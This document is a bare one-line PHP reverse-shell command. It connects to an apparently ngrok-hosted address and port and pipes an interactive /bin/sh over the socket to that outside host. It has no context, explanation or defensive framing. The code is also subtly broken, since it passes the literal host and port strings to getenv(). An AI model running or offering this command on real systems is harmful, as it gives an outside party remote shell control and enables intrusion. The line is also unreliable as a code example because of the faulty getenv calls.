php -r '$sock=fsockopen(getenv("tcp://2.tcp.eu.ngrok.io"),getenv("17016"));exec("/bin/sh -i <&3 >&3 2>&3");'
